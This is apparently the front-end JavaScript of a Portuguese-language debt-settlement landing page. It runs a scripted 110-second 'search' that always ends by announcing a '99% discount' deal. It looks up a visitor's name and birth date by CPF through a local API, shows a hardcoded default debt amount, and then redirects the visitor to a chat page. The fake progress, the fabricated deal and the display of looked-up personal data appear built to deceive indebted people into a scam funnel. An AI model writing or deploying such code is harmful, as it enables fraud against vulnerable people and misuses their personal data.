(function () {
  "use strict";

  const TOTAL_SEC = 110;
  const SHOW_BTN_SEC = 100;
  const MARQUEE_LOOP_SEC = 15;

  const $ = (sel, root) => (root || document).querySelector(sel);

  const progressFill = $(".progress-fill");
  const ctaWrap = $(".cta-wrap");
  const btnAcordo = $("#btn-ver-acordo");
  const iframe = $("#panda-player");

  const acordoLabel = $("#acordo-label");
  const acordoValue = $("#acordo-value");
  const lead = $(".lead");

  const marqueeTrack = $("#marquee-track");
  const marqueeViewport = $("#marquee-viewport");
  const API_IDENT = "../api/identificacao.php";

  let startPerf = null;
  let rafId = 0;
  let leadUpdated = false;

  function effectiveSeconds() {
    if (startPerf == null) return 0;
    return Math.min(TOTAL_SEC, (performance.now() - startPerf) / 1000);
  }

  function tick() {
    const sec = effectiveSeconds();
    const pct = Math.min(100, (sec / TOTAL_SEC) * 100);
    if (progressFill) progressFill.style.width = pct + "%";

    if (sec >= SHOW_BTN_SEC) {
      ctaWrap?.classList.add("is-visible");
      if (!leadUpdated && lead) {
        lead.innerHTML =
          "<strong>Parabéns!</strong> Encontramos um " +
          '<span class="lead__accent">SUPER ACORDO DE 99% DE DESCONTO</span> para você!';
        leadUpdated = true;
      }
      if (acordoLabel && acordoValue) {
        acordoLabel.textContent = "Acordo encontrado";
        acordoValue.textContent = "Desconto 99%";
      }
    }

    rafId = requestAnimationFrame(tick);
  }

  function startClock() {
    if (startPerf != null) return;
    startPerf = performance.now();
    cancelAnimationFrame(rafId);
    rafId = requestAnimationFrame(tick);
  }

  if (iframe) {
    iframe.addEventListener("load", startClock);
  }
  window.addEventListener("load", function () {
    setTimeout(startClock, 5000);
  });

  btnAcordo?.addEventListener("click", function () {
    const next =
      btnAcordo.getAttribute("data-href") ||
      "../chat/index.html" + window.location.search;
    window.location.href = next;
  });

  function fmtCpf(raw) {
    const d = String(raw || "").replace(/\D/g, "").slice(0, 11);
    if (d.length !== 11) return "—";
    return d.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  }

  function formatNascDisplay(s) {
    if (!s || s === "00/00/0000") return "—";
    const t = String(s).trim();
    if (/^\d{4}-\d{2}-\d{2}/.test(t)) {
      const p = t.slice(0, 10).split("-");
      return p[2] + "/" + p[1] + "/" + p[0];
    }
    return t;
  }

  function getCpfDigits() {
    const q = new URLSearchParams(window.location.search).get("cpf");
    const fromUrl = q ? q.replace(/\D/g, "") : "";
    if (fromUrl.length === 11) {
      localStorage.setItem("site.cpf", fromUrl);
      return fromUrl;
    }
    const fromLs = (localStorage.getItem("site.cpf") || "").replace(/\D/g, "");
    return fromLs.length === 11 ? fromLs : "";
  }

  function applyUserFields(nome, cpfDigits, nasc) {
    const elNome = $("#user-nome");
    const elCpf = $("#user-cpf");
    const elNasc = $("#user-nasc");
    const elDiv = $("#user-dividas");
    if (elNome) elNome.textContent = nome;
    if (elCpf) elCpf.textContent = fmtCpf(cpfDigits);
    if (elNasc) elNasc.textContent = nasc;
    if (elDiv) {
      elDiv.textContent =
        localStorage.getItem("site.dividas") || "R$ 5.254,90";
    }
  }

  function fillFromCache() {
    const cpfDigits = getCpfDigits();
    const nome = localStorage.getItem("site.nome") || "—";
    const nasc = formatNascDisplay(localStorage.getItem("site.nasc") || "");
    applyUserFields(nome, cpfDigits, nasc || "—");
  }

  function normalizeIdentResponse(data) {
    if (!data || typeof data !== "object" || data.erro) return null;
    const payload = data.data && typeof data.data === "object" ? data.data : data;
    const nome = payload.nome || payload.NOME || "";
    if (!nome) return null;
    return {
      nome: nome,
      nascimento: payload.nascimento || payload.NASC || "",
      cpf: payload.cpf || payload.CPF || "",
    };
  }

  async function fetchIdentificacao(cpfDigits) {
    try {
      const r = await fetch(
        API_IDENT + "?cpf=" + encodeURIComponent(cpfDigits),
        { cache: "no-store" }
      );
      if (!r.ok) return null;
      return normalizeIdentResponse(await r.json());
    } catch (_) {
      return null;
    }
  }

  async function loadIdentificacao() {
    const cpfDigits = getCpfDigits();
    const elNome = $("#user-nome");
    const elCpf = $("#user-cpf");
    const elNasc = $("#user-nasc");

    if (!cpfDigits) {
      applyUserFields("—", "", "—");
      return;
    }

    if (elNome) elNome.textContent = "Carregando...";
    if (elCpf) elCpf.textContent = fmtCpf(cpfDigits);
    if (elNasc) elNasc.textContent = "Carregando...";

    try {
      const ident = await fetchIdentificacao(cpfDigits);
      if (!ident) throw new Error("Sem dados");

      const nome = ident.nome || "—";
      const nasc = formatNascDisplay(ident.nascimento || "");
      const cpfOut = (ident.cpf || cpfDigits).replace(/\D/g, "");

      localStorage.setItem("site.cpf", cpfOut);
      localStorage.setItem("site.nome", nome);
      localStorage.setItem("site.nasc", ident.nascimento || "");

      applyUserFields(nome, cpfOut, nasc);
    } catch (_) {
      fillFromCache();
    }
  }

  loadIdentificacao();

  /** Loop infinito sem CSS transform (melhor no Safari/iOS). */
  function startMarqueeScroll(viewport, firstGroup, durationSec) {
    if (!viewport || !firstGroup) return;
    const dur = durationSec > 0 ? durationSec : MARQUEE_LOOP_SEC;
    let loopW = 0;
    let pos = 0;
    let lastT = performance.now();
    let raf = 0;

    function syncLoopWidth() {
      const w = firstGroup.offsetWidth;
      if (w > 0) loopW = w;
      if (loopW > 0 && pos >= loopW) {
        pos = pos % loopW;
      }
    }

    const ro =
      typeof ResizeObserver !== "undefined"
        ? new ResizeObserver(syncLoopWidth)
        : null;
    if (ro) ro.observe(firstGroup);

    function frame(now) {
      if (loopW < 1) syncLoopWidth();
      if (loopW < 1) {
        raf = requestAnimationFrame(frame);
        return;
      }
      const dt = Math.min(0.064, (now - lastT) / 1000);
      lastT = now;
      pos += (loopW / dur) * dt;
      if (pos >= loopW) pos -= loopW;
      viewport.scrollLeft = pos;
      raf = requestAnimationFrame(frame);
    }

    syncLoopWidth();
    raf = requestAnimationFrame(frame);

    return function stopMarqueeScroll() {
      cancelAnimationFrame(raf);
      if (ro) ro.disconnect();
    };
  }

  async function loadMarquee() {
    let files = [];
    try {
      const r = await fetch("logos/manifest.json", { cache: "no-store" });
      if (r.ok) {
        const j = await r.json();
        if (Array.isArray(j) && j.length) {
          files = j.map(function (f) {
            const name = String(f).replace(/^\/+/, "");
            return "logos/" + encodeURIComponent(name);
          });
        }
      }
    } catch (_) {}

    if (!marqueeTrack) return;
    marqueeTrack.innerHTML = "";

    if (!files.length) {
      const p = document.createElement("p");
      p.style.cssText =
        "margin:0;font-size:12px;color:#9ca3af;text-align:center;width:100%;padding:8px;";
      p.textContent =
        "Coloque as logos em home/logos e edite logos/manifest.json";
      marqueeTrack.appendChild(p);
      if (marqueeViewport) marqueeViewport.style.overflowX = "hidden";
      return;
    }

    const isNarrow =
      typeof window.matchMedia === "function" &&
      window.matchMedia("(max-width: 480px)").matches;
    const loopFiles = files.slice(0, isNarrow ? 10 : 14);

    function buildGroup() {
      const g = document.createElement("div");
      g.className = "marquee__group";
      loopFiles.forEach(function (src) {
        const wrap = document.createElement("div");
        wrap.className = "marquee__item";
        const img = document.createElement("img");
        img.src = src;
        img.alt = "";

        img.loading = "eager";
        img.decoding = "async";
        img.onerror = function () {
          wrap.style.background = "#e5e7eb";
        };
        wrap.appendChild(img);
        g.appendChild(wrap);
      });
      return g;
    }

    const g1 = buildGroup();
    const g2 = buildGroup();
    marqueeTrack.appendChild(g1);
    marqueeTrack.appendChild(g2);

    const reduceMotion =
      typeof window.matchMedia === "function" &&
      window.matchMedia("(prefers-reduced-motion: reduce)").matches;
    if (!reduceMotion && marqueeViewport) {
      startMarqueeScroll(marqueeViewport, g1, MARQUEE_LOOP_SEC);
    }
  }

  loadMarquee();
})();
